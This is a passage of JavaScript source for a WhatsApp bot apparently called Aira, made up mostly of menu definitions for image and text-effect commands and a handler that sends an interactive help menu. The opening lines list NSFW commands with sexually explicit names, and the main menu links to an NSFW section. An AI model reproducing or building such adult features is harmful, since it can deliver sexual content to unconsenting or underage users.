    { "header": "Cuckold", "title": "Fitur cuckold", "id": ".cuckold" },
    { "header": "Cum", "title": "Fitur cum", "id": ".cum" },
    { "header": "Foot", "title": "Fitur foot", "id": ".foot" },
    { "header": "Gangbang", "title": "Fitur gangbang", "id": ".gangbang" },
    { "header": "Glasses", "title": "Fitur glasses", "id": ".glasses" },
    { "header": "Jahy", "title": "Fitur jahy", "id": ".jahy" },
    { "header": "Masturbation", "title": "Fitur masturbation", "id": ".masturbation" },
    { "header": "NSFW Neko", "title": "Fitur nsfw_neko", "id": ".nsfw_neko" },
    { "header": "Orgy", "title": "Fitur orgy", "id": ".orgy" },
    { "header": "Panties", "title": "Fitur panties", "id": ".panties" },
    { "header": "Tentacles", "title": "Fitur tentacles", "id": ".tentacles" },
    { "header": "Thighs", "title": "Fitur thighs", "id": ".thighs" },
    { "header": "Zettai", "title": "Fitur zettai", "id": ".zettai" }
]

},
{
"title": "Photooxy Menu 🌅", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
  { "header": "Halloween2", "title": "Fitur halloween2", "id": ".halloween2" },
  { "header": "Horror", "title": "Fitur horror", "id": ".horror" },
  { "header": "Game8bit", "title": "Fitur game8bit", "id": ".game8bit" },
  { "header": "Layered", "title": "Fitur layered", "id": ".layered" },
  { "header": "Glitch2", "title": "Fitur glitch2", "id": ".glitch2" },
  { "header": "Coolg", "title": "Fitur coolg", "id": ".coolg" },
  { "header": "Coolwg", "title": "Fitur coolwg", "id": ".coolwg" },
  { "header": "Realistic", "title": "Fitur realistic", "id": ".realistic" },
  { "header": "Space3d", "title": "Fitur space3d", "id": ".space3d" },
  { "header": "Gtiktok", "title": "Fitur gtiktok", "id": ".gtiktok" },
  { "header": "Stone", "title": "Fitur stone", "id": ".stone" },
  { "header": "Marvel", "title": "Fitur marvel", "id": ".marvel" },
  { "header": "Pornhub", "title": "Fitur pornhub", "id": ".pornhub" },
  { "header": "Avengers", "title": "Fitur avengers", "id": ".avengers" },
  { "header": "Metalr", "title": "Fitur metalr", "id": ".metalr" },
  { "header": "Metalg", "title": "Fitur metalg", "id": ".metalg" },
  { "header": "Metalg2", "title": "Fitur metalg2", "id": ".metalg2" },
  { "header": "Lion", "title": "Fitur lion", "id": ".lion" },
  { "header": "Wolf_bw", "title": "Fitur wolf_bw", "id": ".wolf_bw" },
  { "header": "Wolf_g", "title": "Fitur wolf_g", "id": ".wolf_g" },
  { "header": "Ninja", "title": "Fitur ninja", "id": ".ninja" },
  { "header": "3dsteel", "title": "Fitur 3dsteel", "id": ".3dsteel" },
  { "header": "Horror2", "title": "Fitur horror2", "id": ".horror2" },
  { "header": "Lava", "title": "Fitur lava", "id": ".lava" },
  { "header": "Bagel", "title": "Fitur bagel", "id": ".bagel" },
  { "header": "Blackpink", "title": "Fitur blackpink", "id": ".blackpink" },
  { "header": "Rainbow2", "title": "Fitur rainbow2", "id": ".rainbow2" },
  { "header": "Water_pipe", "title": "Fitur water_pipe", "id": ".water_pipe" },
  { "header": "Halloween", "title": "Fitur halloween", "id": ".halloween" },
  { "header": "Sketch", "title": "Fitur sketch", "id": ".sketch" },
  { "header": "Sircuit", "title": "Fitur sircuit", "id": ".sircuit" },
  { "header": "Discovery", "title": "Fitur discovery", "id": ".discovery" },
  { "header": "Metallic2", "title": "Fitur metallic2", "id": ".metallic2" },
  { "header": "Fiction", "title": "Fitur fiction", "id": ".fiction" },
  { "header": "Demon", "title": "Fitur demon", "id": ".demon" },
  { "header": "Transformer", "title": "Fitur transformer", "id": ".transformer" },
  { "header": "Berry", "title": "Fitur berry", "id": ".berry" },
  { "header": "Thunder", "title": "Fitur thunder", "id": ".thunder" },
  { "header": "3dstone", "title": "Fitur 3dstone", "id": ".3dstone" },
  { "header": "Magma", "title": "Fitur magma", "id": ".magma" },
  { "header": "Neon", "title": "Fitur neon", "id": ".neon" },
  { "header": "Glitch", "title": "Fitur glitch", "id": ".glitch" },
  { "header": "Harry_potter", "title": "Fitur harry_potter", "id": ".harry_potter" },
  { "header": "Embossed", "title": "Fitur embossed", "id": ".embossed" },
  { "header": "Broken", "title": "Fitur broken", "id": ".broken" },
  { "header": "Papercut", "title": "Fitur papercut", "id": ".papercut" },
  { "header": "Gradient", "title": "Fitur gradient", "id": ".gradient" },
  { "header": "Glossy", "title": "Fitur glossy", "id": ".glossy" },
  { "header": "Watercolor", "title": "Fitur watercolor", "id": ".watercolor" },
  { "header": "Multicolor", "title": "Fitur multicolor", "id": ".multicolor" },
  { "header": "Neon_devil", "title": "Fitur neon_devil", "id": ".neon_devil" },
  { "header": "Underwater", "title": "Fitur underwater", "id": ".underwater" },
  { "header": "Bear", "title": "Fitur bear", "id": ".bear" },
  { "header": "Wonderfulg", "title": "Fitur wonderfulg", "id": ".wonderfulg" },
  { "header": "Christmas", "title": "Fitur christmas", "id": ".christmas" },
  { "header": "Neon_light", "title": "Fitur neon_light", "id": ".neon_light" },
  { "header": "Snow", "title": "Fitur snow", "id": ".snow" },
  { "header": "Cloudsky", "title": "Fitur cloudsky", "id": ".cloudsky" },
  { "header": "Luxury2", "title": "Fitur luxury2", "id": ".luxury2" },
  { "header": "Gradient2", "title": "Fitur gradient2", "id": ".gradient2" },
  { "header": "Summer", "title": "Fitur summer", "id": ".summer" },
  { "header": "Writing", "title": "Fitur writing", "id": ".writing" },
  { "header": "Engraved", "title": "Fitur engraved", "id": ".engraved" },
  { "header": "Summery", "title": "Fitur summery", "id": ".summery" },
  { "header": "3dglue", "title": "Fitur 3dglue", "id": ".3dglue" },
  { "header": "Metaldark", "title": "Fitur metaldark", "id": ".metaldark" },
  { "header": "Neonlight", "title": "Fitur neonlight", "id": ".neonlight" },
  { "header": "Oscar", "title": "Fitur oscar", "id": ".oscar" },
  { "header": "Minion", "title": "Fitur minion", "id": ".minion" },
  { "header": "Holographic", "title": "Fitur holographic", "id": ".holographic" },
  { "header": "Purple", "title": "Fitur purple", "id": ".purple" },
  { "header": "Glossyb", "title": "Fitur glossyb", "id": ".glossyb" },
  { "header": "Deluxe2", "title": "Fitur deluxe2", "id": ".deluxe2" },
  { "header": "Glossyc", "title": "Fitur glossyc", "id": ".glossyc" },
  { "header": "Fabric", "title": "Fitur fabric", "id": ".fabric" },
  { "header": "Neonc", "title": "Fitur neonc", "id": ".neonc" },
  { "header": "Newyear", "title": "Fitur newyear", "id": ".newyear" },
  { "header": "Newyear2", "title": "Fitur newyear2", "id": ".newyear2" },
  { "header": "Xmas", "title": "Fitur xmas", "id": ".xmas" },
  { "header": "Metals", "title": "Fitur metals", "id": ".metals" },
  { "header": "Blood", "title": "Fitur blood", "id": ".blood" },
  { "header": "Darkg", "title": "Fitur darkg", "id": ".darkg" },
  { "header": "Joker", "title": "Fitur joker", "id": ".joker" },
  { "header": "Wicker", "title": "Fitur wicker", "id": ".wicker" },
  { "header": "Natural", "title": "Fitur natural", "id": ".natural" },
  { "header": "Firework", "title": "Fitur firework", "id": ".firework" },
  { "header": "Skeleton", "title": "Fitur skeleton", "id": ".skeleton" },
  { "header": "Balloon", "title": "Fitur balloon", "id": ".balloon" },
  { "header": "Balloon2", "title": "Fitur balloon2", "id": ".balloon2" },
  { "header": "Balloon3", "title": "Fitur balloon3", "id": ".balloon3" },
  { "header": "Balloon4", "title": "Fitur balloon4", "id": ".balloon4" },
  { "header": "Balloon5", "title": "Fitur balloon5", "id": ".balloon5" },
  { "header": "Balloon6", "title": "Fitur balloon6", "id": ".balloon6" },
  { "header": "Balloon7", "title": "Fitur balloon7", "id": ".balloon7" },
  { "header": "Steel", "title": "Fitur steel", "id": ".steel" },
  { "header": "Gloss", "title": "Fitur gloss", "id": ".gloss" },
  { "header": "Denim", "title": "Fitur denim", "id": ".denim" },
  { "header": "Decorate", "title": "Fitur decorate", "id": ".decorate" },
  { "header": "Decorate2", "title": "Fitur decorate2", "id": ".decorate2" },
  { "header": "Peridot", "title": "Fitur peridot", "id": ".peridot" },
  { "header": "Rock", "title": "Fitur rock", "id": ".rock" },
  { "header": "Glass", "title": "Fitur glass", "id": ".glass" },
  { "header": "Glass2", "title": "Fitur glass2", "id": ".glass2" },
  { "header": "Glass3", "title": "Fitur glass3", "id": ".glass3" },
  { "header": "Glass4", "title": "Fitur glass4", "id": ".glass4" },
  { "header": "Glass5", "title": "Fitur glass5", "id": ".glass5" },
  { "header": "Glass6", "title": "Fitur glass6", "id": ".glass6" },
  { "header": "Glass7", "title": "Fitur glass7", "id": ".glass7" },
  { "header": "Glass8", "title": "Fitur glass8", "id": ".glass8" },
  { "header": "Captain_as2", "title": "Fitur captain_as2", "id": ".captain_as2" },
  { "header": "Robot", "title": "Fitur robot", "id": ".robot" },
  { "header": "Equalizer", "title": "Fitur equalizer", "id": ".equalizer" },
  { "header": "Toxic", "title": "Fitur toxic", "id": ".toxic" },
  { "header": "Sparkling", "title": "Fitur sparkling", "id": ".sparkling" },
  { "header": "Sparkling2", "title": "Fitur sparkling2", "id": ".sparkling2" },
  { "header": "Sparkling3", "title": "Fitur sparkling3", "id": ".sparkling3" },
  { "header": "Sparkling4", "title": "Fitur sparkling4", "id": ".sparkling4" },
  { "header": "Sparkling5", "title": "Fitur sparkling5", "id": ".sparkling5" },
  { "header": "Sparkling6", "title": "Fitur sparkling6", "id": ".sparkling6" },
  { "header": "Sparkling7", "title": "Fitur sparkling7", "id": ".sparkling7" },
  { "header": "Decorative", "title": "Fitur decorative", "id": ".decorative" },
  { "header": "Chocolate", "title": "Fitur chocolate", "id": ".chocolate" },
  { "header": "Strawberry", "title": "Fitur strawberry", "id": ".strawberry" },
  { "header": "Koifish", "title": "Fitur koifish", "id": ".koifish" },
  { "header": "Bread", "title": "Fitur bread", "id": ".bread" },
  { "header": "Matrix", "title": "Fitur matrix", "id": ".matrix" },
  { "header": "Blood2", "title": "Fitur blood2", "id": ".blood2" },
  { "header": "Neonligth2", "title": "Fitur neonligth2", "id": ".neonligth2" },
  { "header": "Thunder2", "title": "Fitur thunder2", "id": ".thunder2" },
  { "header": "3dbox", "title": "Fitur 3dbox", "id": ".3dbox" },
  { "header": "Neon2", "title": "Fitur neon2", "id": ".neon2" },
  { "header": "Roadw", "title": "Fitur roadw", "id": ".roadw" },
  { "header": "Bokeh", "title": "Fitur bokeh", "id": ".bokeh" },
  { "header": "Gneon", "title": "Fitur gneon", "id": ".gneon" },
  { "header": "Advanced", "title": "Fitur advanced", "id": ".advanced" },
  { "header": "Dropwater", "title": "Fitur dropwater", "id": ".dropwater" },
  { "header": "Wall", "title": "Fitur wall", "id": ".wall" },
  { "header": "Chrismast", "title": "Fitur chrismast", "id": ".chrismast" },
  { "header": "Honey", "title": "Fitur honey", "id": ".honey" },
  { "header": "Drug", "title": "Fitur drug", "id": ".drug" },
  { "header": "Marble", "title": "Fitur marble", "id": ".marble" },
  { "header": "Marble2", "title": "Fitur marble2", "id": ".marble2" },
  { "header": "Ice", "title": "Fitur ice", "id": ".ice" },
  { "header": "Juice", "title": "Fitur juice", "id": ".juice" },
  { "header": "Rusty", "title": "Fitur rusty", "id": ".rusty" },
  { "header": "Abstra", "title": "Fitur abstra", "id": ".abstra" },
  { "header": "Biscuit", "title": "Fitur biscuit", "id": ".biscuit" },
  { "header": "Wood", "title": "Fitur wood", "id": ".wood" },
  { "header": "Scifi", "title": "Fitur scifi", "id": ".scifi" },
  { "header": "Metalr", "title": "Fitur metalr", "id": ".metalr" },
  { "header": "Purpleg", "title": "Fitur purpleg", "id": ".purpleg" },
  { "header": "Shiny", "title": "Fitur shiny", "id": ".shiny" },
  { "header": "Jewelry", "title": "Fitur jewelry", "id": ".jewelry" },
  { "header": "Jewelry2", "title": "Fitur jewelry2", "id": ".jewelry2" },
  { "header": "Jewelry3", "title": "Fitur jewelry3", "id": ".jewelry3" },
  { "header": "Jewelry4", "title": "Fitur jewelry4", "id": ".jewelry4" },
  { "header": "Jewelry5", "title": "Fitur jewelry5", "id": ".jewelry5" },
  { "header": "Jewelry6", "title": "Fitur jewelry6", "id": ".jewelry6" },
  { "header": "Jewelry7", "title": "Fitur jewelry7", "id": ".jewelry7" },
  { "header": "Jewelry8", "title": "Fitur jewelry8", "id": ".jewelry8" },
  { "header": "Metalh", "title": "Fitur metalh", "id": ".metalh" },
  { "header": "Golden", "title": "Fitur golden", "id": ".golden" },
  { "header": "Glitter", "title": "Fitur glitter", "id": ".glitter" },
  { "header": "Glitter2", "title": "Fitur glitter2", "id": ".glitter2" },
  { "header": "Glitter3", "title": "Fitur glitter3", "id": ".glitter3" },
  { "header": "Glitter4", "title": "Fitur glitter4", "id": ".glitter4" },
  { "header": "Glitter5", "title": "Fitur glitter5", "id": ".glitter5" },
  { "header": "Glitter6", "title": "Fitur glitter6", "id": ".glitter6" },
  { "header": "Glitter7", "title": "Fitur glitter7", "id": ".glitter7" },
  { "header": "Metale", "title": "Fitur metale", "id": ".metale" },
  { "header": "Carbon", "title": "Fitur carbon", "id": ".carbon" },
  { "header": "Candy", "title": "Fitur candy", "id": ".candy" },
  { "header": "Metalb", "title": "Fitur metalb", "id": ".metalb" },
  { "header": "Gemb", "title": "Fitur gemb", "id": ".gemb" },
  { "header": "3dchrome", "title": "Fitur 3dchrome", "id": ".3dchrome" },
  { "header": "Metalb2", "title": "Fitur metalb2", "id": ".metalb2" },
  { "header": "Metalg", "title": "Fitur metalg", "id": ".metalg" }
]
},
{
"title": "Photooxy Menu 🌅", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
  { "header": "Typography Flower", "title": "Fitur typography-flower", "id": ".typography-flower" },
  { "header": "Under Flower", "title": "Fitur under-flower", "id": ".under-flower" },
  { "header": "Bevel Text", "title": "Fitur bevel-text", "id": ".bevel-text" },
  { "header": "Silk Text", "title": "Fitur silk-text", "id": ".silk-text" },
  { "header": "Smoke Typography", "title": "Fitur smoke-typography", "id": ".smoke-typography" },
  { "header": "Carvedwood", "title": "Fitur carvedwood", "id": ".carvedwood" },
  { "header": "Scary Cemetery", "title": "Fitur scary-cemetery", "id": ".scary-cemetery" },
  { "header": "Royallook", "title": "Fitur royallook", "id": ".royallook" },
  { "header": "Coffeecup2", "title": "Fitur coffeecup2", "id": ".coffeecup2" },
  { "header": "Illuminated", "title": "Fitur illuminated", "id": ".illuminated" },
  { "header": "Harry Potter2", "title": "Fitur harry-potter2", "id": ".harry-potter2" },
  { "header": "Woodblack", "title": "Fitur woodblack", "id": ".woodblack" },
  { "header": "Butterfly Reflection", "title": "Fitur butterfly-reflection", "id": ".butterfly-reflection" },
  { "header": "Watermelon", "title": "Fitur watermelon", "id": ".watermelon" },
  { "header": "Striking", "title": "Fitur striking", "id": ".striking" },
  { "header": "Metallicglow", "title": "Fitur metallicglow", "id": ".metallicglow" },
  { "header": "Rainbow Text", "title": "Fitur rainbow-text", "id": ".rainbow-text" },
  { "header": "Birthday Cake", "title": "Fitur birthday-cake", "id": ".birthday-cake" },
  { "header": "Embroidery", "title": "Fitur embroidery", "id": ".embroidery" },
  { "header": "Crisp", "title": "Fitur crisp", "id": ".crisp" },
  { "header": "Flaming", "title": "Fitur flaming", "id": ".flaming" },
  { "header": "Furtext", "title": "Fitur furtext", "id": ".furtext" },
  { "header": "Nightsky", "title": "Fitur nightsky", "id": ".nightsky" },
  { "header": "Glow Rainbow", "title": "Fitur glow-rainbow", "id": ".glow-rainbow" },
  { "header": "Gradient Avatar", "title": "Fitur gradient-avatar", "id": ".gradient-avatar" },
  { "header": "White Cube", "title": "Fitur white-cube", "id": ".white-cube" },
  { "header": "Honey Text", "title": "Fitur honey-text", "id": ".honey-text" },
  { "header": "Vintage Style", "title": "Fitur vintage-style", "id": ".vintage-style" },
  { "header": "Glowing 3d", "title": "Fitur glowing-3d", "id": ".glowing-3d" },
  { "header": "Army Camouflage", "title": "Fitur army-camouflage", "id": ".army-camouflage" },
  { "header": "Graffiti Cover", "title": "Fitur graffiti-cover", "id": ".graffiti-cover" },
  { "header": "Rainbow Shine", "title": "Fitur rainbow-shine", "id": ".rainbow-shine" },
  { "header": "Smoky Neon", "title": "Fitur smoky-neon", "id": ".smoky-neon" },
  { "header": "Quotes Underfall", "title": "Fitur quotes-underfall", "id": ".quotes-underfall" },
  { "header": "Vector Nature", "title": "Fitur vector-nature", "id": ".vector-nature" },
  { "header": "Yellow Rose", "title": "Fitur yellow-rose", "id": ".yellow-rose" },
  { "header": "Love Text", "title": "Fitur love-text", "id": ".love-text" },
  { "header": "Underwater Ocean", "title": "Fitur underwater-ocean", "id": ".underwater-ocean" },
  { "header": "Nature Text", "title": "Fitur nature-text", "id": ".nature-text" },
  { "header": "Wolf Metal", "title": "Fitur wolf-metal", "id": ".wolf-metal" },
  { "header": "Summer Text", "title": "Fitur summer-text", "id": ".summer-text" },
  { "header": "Wooden Board", "title": "Fitur wooden-board", "id": ".wooden-board" },
  { "header": "Quote Wood", "title": "Fitur quote-wood", "id": ".quote-wood" },
  { "header": "Quotes Undergrass", "title": "Fitur quotes-undergrass", "id": ".quotes-undergrass" },
  { "header": "Naruto Banner", "title": "Fitur naruto-banner", "id": ".naruto-banner" },
  { "header": "Love Message", "title": "Fitur love-message", "id": ".love-message" },
  { "header": "Textoncup2", "title": "Fitur textoncup2", "id": ".textoncup2" },
  { "header": "Burn Paper", "title": "Fitur burn-paper", "id": ".burn-paper" },
  { "header": "Smoke", "title": "Fitur smoke", "id": ".smoke" },
  { "header": "Romantic Messages", "title": "Fitur romantic-messages", "id": ".romantic-messages" },
  { "header": "Shadow Sky", "title": "Fitur shadow-sky", "id": ".shadow-sky" },
  { "header": "Text Cup", "title": "Fitur text-cup", "id": ".text-cup" },
  { "header": "Coffecup", "title": "Fitur coffecup", "id": ".coffecup" },
  { "header": "Battlegrounds Logo", "title": "Fitur battlegrounds-logo", "id": ".battlegrounds-logo" },
  { "header": "Battlefield4", "title": "Fitur battlefield4", "id": ".battlefield4" },
  { "header": "Text 8bit", "title": "Fitur text-8bit", "id": ".text-8bit" }
]

},
{
"title": "Ephoto360 Menu 📷", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
  { "header": "1917text", "title": "Fitur 1917text", "id": ".1917text" },
  { "header": "angelwing", "title": "Fitur angelwing", "id": ".angelwing" },
  { "header": "announofwin", "title": "Fitur announofwin", "id": ".announofwin" },
  { "header": "birthdaycake", "title": "Fitur birthdaycake", "id": ".birthdaycake" },
  { "header": "capercut", "title": "Fitur capercut", "id": ".capercut" },
  { "header": "cardhalloween", "title": "Fitur cardhalloween", "id": ".cardhalloween" },
  { "header": "christmascard", "title": "Fitur christmascard", "id": ".christmascard" },
  { "header": "christmasseason", "title": "Fitur christmasseason", "id": ".christmasseason" },
  { "header": "covergamepubg", "title": "Fitur covergamepubg", "id": ".covergamepubg" },
  { "header": "covergraffiti", "title": "Fitur covergraffiti", "id": ".covergraffiti" },
  { "header": "dragonfire", "title": "Fitur dragonfire", "id": ".dragonfire" },
  { "header": "embroider", "title": "Fitur embroider", "id": ".embroider" },
  { "header": "fabrictext", "title": "Fitur fabrictext", "id": ".fabrictext" },
  { "header": "facebookgold", "title": "Fitur facebookgold", "id": ".facebookgold" },
  { "header": "facebooksilver", "title": "Fitur facebooksilver", "id": ".facebooksilver" },
  { "header": "funnyanimations", "title": "Fitur funnyanimations", "id": ".funnyanimations" },
  { "header": "funnyhalloween", "title": "Fitur funnyhalloween", "id": ".funnyhalloween" },
  { "header": "galaxybat", "title": "Fitur galaxybat", "id": ".galaxybat" },
  { "header": "galaxywallpaper", "title": "Fitur galaxywallpaper", "id": ".galaxywallpaper" },
  { "header": "generalexam", "title": "Fitur generalexam", "id": ".generalexam" },
  { "header": "glowingtext", "title": "Fitur glowingtext", "id": ".glowingtext" },
  { "header": "graffiti3d", "title": "Fitur graffiti3d", "id": ".graffiti3d" },
  { "header": "graffititext", "title": "Fitur graffititext", "id": ".graffititext" },
  { "header": "graffititext2", "title": "Fitur graffititext2", "id": ".graffititext2" },
  { "header": "graffititext3", "title": "Fitur graffititext3", "id": ".graffititext3" },
  { "header": "greetingcardvideo", "title": "Fitur greetingcardvideo", "id": ".greetingcardvideo" },
  { "header": "halloweenbats", "title": "Fitur halloweenbats", "id": ".halloweenbats" },
  { "header": "heartcup", "title": "Fitur heartcup", "id": ".heartcup" },
  { "header": "heartflashlight", "title": "Fitur heartflashlight", "id": ".heartflashlight" },
  { "header": "horrorletter", "title": "Fitur horrorletter", "id": ".horrorletter" },
  { "header": "icetext", "title": "Fitur icetext", "id": ".icetext" },
  { "header": "instagramgold", "title": "Fitur instagramgold", "id": ".instagramgold" },
  { "header": "instagramsilver", "title": "Fitur instagramsilver", "id": ".instagramsilver" },
  { "header": "lightningpubg", "title": "Fitur lightningpubg", "id": ".lightningpubg" },
  { "header": "lovecard", "title": "Fitur lovecard", "id": ".lovecard" },
  { "header": "lovelycute", "title": "Fitur lovelycute", "id": ".lovelycute" },
  { "header": "masteryavatar", "title": "Fitur masteryavatar", "id": ".masteryavatar" },
  { "header": "merrycard", "title": "Fitur merrycard", "id": ".merrycard" },
  { "header": "messagecoffee", "title": "Fitur messagecoffee", "id": ".messagecoffee" },
  { "header": "metalstar", "title": "Fitur metalstar", "id": ".metalstar" },
  { "header": "milkcake", "title": "Fitur milkcake", "id": ".milkcake" },
  { "header": "moderngold", "title": "Fitur moderngold", "id": ".moderngold" },
  { "header": "moderngold2", "title": "Fitur moderngold2", "id": ".moderngold2" },
  { "header": "modengold3", "title": "Fitur modengold3", "id": ".modengold3" },
  { "header": "moderngoldsilver", "title": "Fitur moderngoldsilver", "id": ".moderngoldsilver" },
  { "header": "nameonheart", "title": "Fitur nameonheart", "id": ".nameonheart" },
  { "header": "noeltext", "title": "Fitur noeltext", "id": ".noeltext" },
  { "header": "projectyasuo", "title": "Fitur projectyasuo", "id": ".projectyasuo" },
  { "header": "pubgbirthday", "title": "Fitur pubgbirthday", "id": ".pubgbirthday" },
  { "header": "pubgglicthvideo", "title": "Fitur pubgglicthvideo", "id": ".pubgglicthvideo" },
  { "header": "pubgmascotlogo", "title": "Fitur pubgmascotlogo", "id": ".pubgmascotlogo" },
  { "header": "puppycute", "title": "Fitur puppycute", "id": ".puppycute" },
  { "header": "realembroidery", "title": "Fitur realembroidery", "id": ".realembroidery" },
  { "header": "retrotext", "title": "Fitur retrotext", "id": ".retrotext" },
  { "header": "rosebirthday", "title": "Fitur rosebirthday", "id": ".rosebirthday" },
  { "header": "snowontext", "title": "Fitur snowontext", "id": ".snowontext" },
  { "header": "starsnight", "title": "Fitur starsnight", "id": ".starsnight" },
  { "header": "summerbeach", "title": "Fitur summerbeach", "id": ".summerbeach" },
  { "header": "sunglightshadow", "title": "Fitur sunglightshadow", "id": ".sunglightshadow" },
  { "header": "textcakes", "title": "Fitur textcakes", "id": ".textcakes" },
  { "header": "texthalloween", "title": "Fitur texthalloween", "id": ".texthalloween" },
  { "header": "textonglass", "title": "Fitur textonglass", "id": ".textonglass" },
  { "header": "textsky", "title": "Fitur textsky", "id": ".textsky" },
  { "header": "thundertext", "title": "Fitur thundertext", "id": ".thundertext" },
  { "header": "twittergold", "title": "Fitur twittergold", "id": ".twittergold" },
  { "header": "twittersilver", "title": "Fitur twittersilver", "id": ".twittersilver" },
  { "header": "viettel", "title": "Fitur viettel", "id": ".viettel" },
  { "header": "vintagetelevision", "title": "Fitur vintagetelevision", "id": ".vintagetelevision" },
  { "header": "watercolor2", "title": "Fitur watercolor2", "id": ".watercolor2" },
  { "header": "womansday", "title": "Fitur womansday", "id": ".womansday" },
  { "header": "writeblood", "title": "Fitur writeblood", "id": ".writeblood" },
  { "header": "writegalaxy", "title": "Fitur writegalaxy", "id": ".writegalaxy" },
  { "header": "writehorror", "title": "Fitur writehorror", "id": ".writehorror" },
  { "header": "youtubegold", "title": "Fitur youtubegold", "id": ".youtubegold" },
  { "header": "youtubesilver", "title": "Fitur youtubesilver", "id": ".youtubesilver" },
  { "header": "zombie3d", "title": "Fitur zombie3d", "id": ".zombie3d" }

]

},
{
"title": "Logo Menu 🖼️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
  { "header": "Avataroverwatch", "title": "Fitur avataroverwatch", "id": ".avataroverwatch" },
  { "header": "Logoaccording", "title": "Fitur logoaccording", "id": ".logoaccording" },
  { "header": "Mascotstyle", "title": "Fitur mascotstyle", "id": ".mascotstyle" },
  { "header": "Letterlogos", "title": "Fitur letterlogos", "id": ".letterlogos" },
  { "header": "Bannerofpubg", "title": "Fitur bannerofpubg", "id": ".bannerofpubg" },
  { "header": "Bannerofapex", "title": "Fitur bannerofapex", "id": ".bannerofapex" },
  { "header": "Bannerofoverwatch", "title": "Fitur bannerofoverwatch", "id": ".bannerofoverwatch" },
  { "header": "Banneroffreefire", "title": "Fitur banneroffreefire", "id": ".banneroffreefire" },
  { "header": "Gunlogogaming", "title": "Fitur gunlogogaming", "id": ".gunlogogaming" },
  { "header": "Pencilsketch", "title": "Fitur pencilsketch", "id": ".pencilsketch" },
  { "header": "Companylogo", "title": "Fitur companylogo", "id": ".companylogo" },
  { "header": "Companylogo2", "title": "Fitur companylogo2", "id": ".companylogo2" },
  { "header": "Teamlogo", "title": "Fitur teamlogo", "id": ".teamlogo" },
  { "header": "Bannerofaov", "title": "Fitur bannerofaov", "id": ".bannerofaov" },
  { "header": "Fbgamepubgcover", "title": "Fitur fbgamepubgcover", "id": ".fbgamepubgcover" },
  { "header": "Banneroflol", "title": "Fitur banneroflol", "id": ".banneroflol" },
  { "header": "Anonymous", "title": "Fitur anonymous", "id": ".anonymous" },
  { "header": "Metalmascot", "title": "Fitur metalmascot", "id": ".metalmascot" },
  { "header": "Blueneon", "title": "Fitur blueneon", "id": ".blueneon" },
  { "header": "Coverbannerlol", "title": "Fitur coverbannerlol", "id": ".coverbannerlol" },
  { "header": "Pubglogomaker", "title": "Fitur pubglogomaker", "id": ".pubglogomaker" },
  { "header": "Colorfulpubg", "title": "Fitur colorfulpubg", "id": ".colorfulpubg" },
  { "header": "Astronotspace", "title": "Fitur astronotspace", "id": ".astronotspace" },
  { "header": "Wallpaperaov", "title": "Fitur wallpaperaov", "id": ".wallpaperaov" },
  { "header": "Maketeamlogo", "title": "Fitur maketeamlogo", "id": ".maketeamlogo" },
  { "header": "Circlemascotteam", "title": "Fitur circlemascotteam", "id": ".circlemascotteam" },
  { "header": "Wallpaperml", "title": "Fitur wallpaperml", "id": ".wallpaperml" },
  { "header": "Dragonballfb", "title": "Fitur dragonballfb", "id": ".dragonballfb" },
  { "header": "Effect3donbeach", "title": "Fitur effect3donbeach", "id": ".effect3donbeach" },
  { "header": "Cutegirlgamer", "title": "Fitur cutegirlgamer", "id": ".cutegirlgamer" }

]}
]}`
}

]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await Aira.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})



Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'menu': case 'simplemenu': case 'help':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: simpleMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/


let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: simpleMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./aira.jpg")}, { upload: Aira.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Menu", "sections": [{ "title": "# Pilih Salah Satu Menu Di Bawah Ini", "highlight_label": \"Powered By ${setting.ownerName}\", "rows": [{ "header": "Allmenu", "title": "List All Fitur Bot", "id": ".allmenu" }, 
{ "header": "Mainmenu", "title": "List Main Menu", "id": ".mainmenu" }, 
{ "header": "Converter", "title": "List Convert Menu", "id": ".convertmenu"},
{ "header": "Anonymousmenu", "title": "Menu Anonymous","id":" .anonymousmenu"},
{ "header": "Storemenu", "title": "List Store Menu", "id": ".storemenu"},
{ "header": "Panelmenu", "title": "List Panel Menu", "id": ".panelmenu"},
{ "header": "ResellerMenu", "title": "List Reseller Menu", "id": .resellermenu"},
{ "header": "nsfwmenu", "title": "List Nsfw-Menu", "id": ".nsfwmenu"},
{ "header": "Rpgmenu", "title": "List Rpg Menu", "id": ".rpgmenu"}, 
{ "header": "Gamemenu", "title": "List Menu Game", "id": ".gamemenu"},
{ "header": "Grupmenu", "title": "List Grup Menu", "id": ".groupmenu"},
{ "header": "Downloadmenu", "title": "List Download Menu", "id":" downloadmenu"},
{ "header": "Searchmenu", "title": "List Search Menu", "id": ".searchmenu"},
